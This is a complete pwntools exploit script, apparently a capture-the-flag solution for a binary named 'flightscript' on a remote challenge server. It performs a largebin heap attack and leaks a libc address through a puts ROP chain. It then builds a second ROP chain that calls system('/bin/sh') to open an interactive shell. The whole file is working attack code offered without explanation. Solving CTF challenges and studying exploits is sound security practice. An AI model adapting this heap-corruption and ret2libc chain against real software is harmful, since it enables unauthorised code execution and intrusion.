#!/usr/bin/env python3

from pwn import *

elf = ELF("./flightscript")
libc = ELF("./libc.so.6")

context.binary = elf

gdb_cmds = ["c"]
r = ["chal.competitivecyber.club",8885]

def conf():
	if args.REMOTE:
		p = remote(r[0],r[1])
	else:
		p = elf.process()
		if args.GDB:
			gdb.attach(p,gdbscript='\n'.join(gdb_cmds))
	return p

index = 0
p = conf()

def malloc(size):
	global index
	p.readuntil(">> ")
	p.sendline("2")
	p.readuntil(">> ")
	p.sendline(str(size))
	p.readuntil(">> ")
	p.sendline("temp")
	p.readuntil(">> ")
	p.sendline("y")
	index += 1
	return index-1

def edit(index,data):
	p.readuntil(">> ")
	p.sendline("3")
	p.readuntil(">> ")
	p.sendline(str(index))
	p.readuntil(">> ")
	p.sendline(data)

def free(index):
	p.readuntil(">> ")
	p.sendline("4")
	p.readuntil(">> ")
	p.sendline(str(index))

def main():

	# largebin attack
	p1 = malloc(1050)
	g1 = malloc(1033)

	p2 = malloc(1040)
	g2 = malloc(1033)

	## p1->largebin
	free(p1)
	malloc(5000)

	## p2->unsortedbin
	free(p2)

	## edit p1->bk_nextsize = (&loglen-0x20)
	edit(p1,p64(elf.symbols['loglen']-0x20))

	## p2->largebin
	### p1->bk_ns->fd_ns=&p2
	malloc(5000)

	# Libc leak
	puts_rop = ROP(elf)
	puts_rop.raw(b"a"*280)
	puts_rop.puts(elf.got['puts'])
	puts_rop.call(elf.symbols['main'])

	p.readuntil(">> ")
	p.sendline("1")
	p.readuntil(">> ")
	p.sendline(puts_rop.chain())
	p.readuntil(">> ")
	p.sendline("5")
	p.readuntil("Have a nice day!\n")
	puts = u64(p.readuntil("\n")[:-1]+b'\x00\x00')
	libc.address = puts-libc.symbols['puts']
	log.success("libc @ "+str(hex(libc.address)))

	# execve('/bin/sh')
	rop = ROP(elf)
	rop.raw(b"a"*280)
	rop.raw(rop.ret.address) # empty ret
	rop.raw(rop.rdi.address) # pop rdi; ret;
	rop.raw(next(libc.search(b'/bin/sh')))
	rop.raw(libc.symbols['system'])

	p.readuntil(">> ")
	p.sendline("1")
	p.readuntil(">> ")
	p.sendline(rop.chain())
	p.readuntil(">> ")
	p.sendline("5")

	p.interactive()


if __name__ == "__main__":
	main()
